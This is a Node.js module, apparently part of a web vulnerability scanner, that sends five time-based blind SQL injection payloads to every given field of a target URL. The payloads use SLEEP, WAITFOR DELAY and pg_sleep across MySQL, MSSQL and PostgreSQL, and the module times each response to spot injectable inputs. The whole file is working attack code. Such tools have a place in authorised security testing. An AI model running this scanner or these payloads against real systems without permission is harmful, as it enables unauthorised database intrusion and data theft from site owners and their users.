// engine-time-delay.js
const axios = require('axios');

async function run(url, method = 'GET', headers = {}, fields = []) {
  const payloads = [
    "' OR IF(1=1, SLEEP(5), 0)-- ",
  "' AND SLEEP(5)-- ",
  "'; WAITFOR DELAY '0:0:5'--",
  "' OR pg_sleep(5)--",
  "1) OR sleep(5)#",
  ];

  const result = [];

  for (const field of fields) {
    for (const payload of payloads) {
      const data = {};
      data[field] = payload;

      const config = {
        method,
        headers,
        timeout: 8000, // reasonable to detect delay
      };

      const start = Date.now();

      try {
        if (method === 'GET') {
          const query = new URLSearchParams(data).toString();
          config.url = `${url}?${query}`;
          const res = await axios.get(config.url, config);
          const end = Date.now();

          result.push({
            engine: 'Time-based',
            field,
            payload,
            status: res.status,
            duration: end - start,
            evidence: res.data,
          });
        } else {
          config.url = url;
          config.data = data;
          const res = await axios(config);
          const end = Date.now();

          result.push({
            engine: 'Time-based',
            field,
            payload,
            status: res.status,
            duration: end - start,
            evidence: res.data,
          });
        }
      } catch (err) {
        const end = Date.now();
        result.push({
          engine: 'Time-based',
          field,
          payload,
          status: 0,
          duration: end - start,
          evidence: err.message,
        });
      }
    }
  }

  return result;
}

module.exports = { run };
